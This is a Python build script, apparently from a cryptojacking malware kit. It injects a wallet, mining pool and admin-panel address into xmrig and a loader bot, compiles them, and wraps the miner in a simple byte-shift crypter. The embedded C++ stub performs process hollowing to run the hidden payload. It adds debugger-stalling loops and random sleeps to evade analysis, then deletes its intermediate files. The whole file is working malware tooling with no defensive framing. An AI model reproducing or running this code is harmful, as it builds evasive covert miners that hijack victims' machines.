import os, sys, time, random, subprocess


def load_userdata(wallet, pool, ww, logger, adminka):
    with open("D:\\msys64\\xmrig-master\\src\\ex.cpp", "r") as f:
        file = f.read()
        file = file.replace("%u%", wallet)
        file = file.replace("%p%", pool)
        file = file.replace("%w%", ww)
        with open("D:\\msys64\\xmrig-master\\src\\xmrig.cpp", "w") as w:
            w.write(file)
    with open(os.getcwd()+"\\Bot\\Miner\\ex.cs", "r") as f:
        file = f.read()
        file = file.replace("%l%", logger)
        file = file.replace("%a%", adminka)
        with open(os.getcwd()+"\\Bot\\Miner\\Program.cs", "w") as w:
            w.write(file)

def writeBytes(key):
    with open(os.getcwd()+"\\file.txt", "r") as f:
        file = f.read()
        with open(os.getcwd()+"\\Miner\\CryptRunPe\\winhost.cpp", "w") as w:
            w.write("#include <stdafx.h>\n#include \"process.h\"\n #include \"memrun.h\"\nusing namespace std;\n")
            with open("ex.txt") as ex:
                w.write(file)
                exx = ex.read()
                w.write(exx)

def compile(path, file):
    os.system("%windir%\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe \""+path+file+".sln\" /p:Configuration=Release")
	
def compileM(path, file):
    os.system("msbuild.exe \""+path+file+".sln\" /p:Configuration=Release")

def compileR(path, file):
    os.system("msbuild.exe \""+path+file+".sln\" /p:Configuration=Release /p:Platform=\"WIN32\"")
def xcopy(path, out):
    try:
        with open(path, "rb") as f:
            file = f.read()
            with open(out, "wb") as w:
                w.write(bytearray(file))
    except:
        pass


def crypt(name, key):
    with open('encoder.cpp', 'w') as w:
        txt = '\n\
        #include <Windows.h>\n\
        #include <winternl.h>\n\
        #include <iostream>\n\
        #include <string>\n\
        #include <fstream>\n\
        using namespace std;\n\
        int main()\n\
        {\n\
            FILE * file = fopen("in.exe", "rb");\n\
            if (file == NULL) return 0;\n\
            fseek(file, 0, SEEK_END);\n\
            long int size = ftell(file);\n\
            fclose(file);\n\
            file = fopen("in.exe", "rb");\n\
            unsigned char * in = (unsigned char *)malloc(size);\n\
            int bytes_read = fread(in, sizeof(unsigned char), size, file);\n\
            fclose(file);\n\
            for (int i = 0; i < size; i++) {\n\
                in[i] = in[i] - 0x0%n%;\n\
            }\n\
            file = fopen("out.exe", "wb");\n\
            int bytes_written = fwrite(in, sizeof(unsigned char), size, file);\n\
            fclose(file);\n\
            for (int i = 0; i < size; i++) {\n\
                in[i] = in[i] + 0x0%n%;\n\
            }\n\
            file = fopen("decr.exe", "wb");\n\
            bytes_written = fwrite(in, sizeof(unsigned char), size, file);\n\
            fclose(file);\n\
            return 0;\n\
        }\n\
        '
        txt = txt.replace("%n%", str(key))
        w.write(txt)
    os.system("g++ -o enc encoder.cpp")
    os.system("C:\Python27\python.exe cv.py")
    with open('file.txt', 'r') as r:
        with open(os.getcwd()+"\\src\\crypter\\crypter.cpp", "w") as w:
            txt = '\
            #include "stdafx.h"\n\
            #include "Crypter.h"\n\
            #include <windows.h>\n\
            #include <winternl.h>\n\
            #pragma comment(lib,"ws2_32.lib")\n\
            #pragma comment(lib,"ntdll.lib")\n\
            '+ r.read() + '\
            int RunPortableExecutable(void* Image) {\n\
            IMAGE_DOS_HEADER* DOSHeader;\n\
            IMAGE_NT_HEADERS* NtHeader;\n\
            IMAGE_SECTION_HEADER* SectionHeader;\n\
            PROCESS_INFORMATION PI;\n\
            STARTUPINFOA SI;\n\
            CONTEXT* CTX;\n\
            DWORD* ImageBase;\n\
            void* pImageBase;\n\
            int count;\n\
            char buffer[MAX_PATH];\n\
            GetModuleFileNameA(NULL, (LPSTR)buffer, MAX_PATH);\n\
            char *CurrentFilePath = buffer;\n\
            DOSHeader = PIMAGE_DOS_HEADER(Image);\n\
            NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);\n\
            if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {\n\
                ZeroMemory(&PI, sizeof(PI));\n\
                ZeroMemory(&SI, sizeof(SI));\n\
                typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);\n\
                NtUnmapViewOfSection mNtUnmapViewOfSection;\n\
                if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI)) {\n\
                    CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));\n\
                    CTX->ContextFlags = CONTEXT_FULL;\n\
                    if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {\n\
                        ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);\n\
                        pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),\n\
                            NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);\n\
                        WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);\n\
                        for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {\n\
                            SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));\n\
                            WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),\n\
                                LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);\n\
                        }\n\
                        WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);\n\
                        CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;\n\
                        SetThreadContext(PI.hThread, LPCONTEXT(CTX));\n\
                        ResumeThread(PI.hThread);\n\
                        return 0;\n\
                    }\n\
                }\n\
            }\n\
        }\n\
        int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {\n\
            for (int i = 0; i < 550000; i++)\n\
                OutputDebugStringW(L"");\n\
            for (int i = 0; i < sizeof(rawData) / sizeof(*rawData); i++) {\n\
                unsigned char b = rawData[i] + 0x0%n%;\n\
                rawData[i] = b;\n\
            }\n\
            Sleep(((rand() % 5 + 1) + 5) * 1000);\n\
            RunPortableExecutable(rawData);\n\
            return 0;\n\
        }\
            '
            txt = txt.replace("%n%", str(key))
            w.write(txt)
        compileM(os.getcwd()+"\\src\\", "ConsoleApplication1")
        xcopy(os.getcwd() + "\\src\\Release\\Crypter.exe", os.getcwd()+"\\"+name+".exe")

key = random.randint(1, 100)
u = sys.argv[1]
w = sys.argv[2]
p = sys.argv[3]
l = sys.argv[4]
a = sys.argv[5]



load_userdata(u, p, w, l, a)
compile(os.getcwd()+"\\Bot\\", "LoaderBot")
xcopy(os.getcwd()+"\\Bot\\Miner\\bin\\Release\\LoaderBot.exe", "Bot.exe")
compileR(os.getcwd()+"\\rig\\", "xmrig")
xcopy(os.getcwd()+"\\rig\\Release\\xmrig.exe", "out.exe")
crypt("test", key)
os.system("C:\Python27\python.exe cv.py")
writeBytes(key)
compileM(os.getcwd()+"\\Miner\\", "winhost")
xcopy(os.getcwd()+"\\Miner\\Release\\winhost.exe", "in.exe")
print(os.getcwd()+"\\enc.exe")
subprocess.call(os.getcwd()+"\\enc.exe")
crypt("winhost", key)

os.system("del file.txt")
os.system("del in.exe")
os.system("del out.exe")
os.system("del decr.exe")
os.system("del enc.exe")
os.system("del test.exe")
